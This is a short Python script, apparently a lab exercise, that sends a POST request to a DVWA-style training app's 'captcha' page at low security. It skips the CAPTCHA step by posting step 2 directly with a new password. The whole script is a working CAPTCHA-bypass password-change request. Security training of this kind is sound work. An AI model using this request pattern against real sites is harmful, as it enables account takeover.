import requests

url = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/captcha/"
cookies = {
    "PHPSESSID":"123",
    "security":"low"
}
data = {
    "step":"2",
    "password_new":"test666",
    "password_conf":"test666",
    "Change":"Change"
}
resp = requests.post(url,data=data,cookies=cookies)
print(resp.text)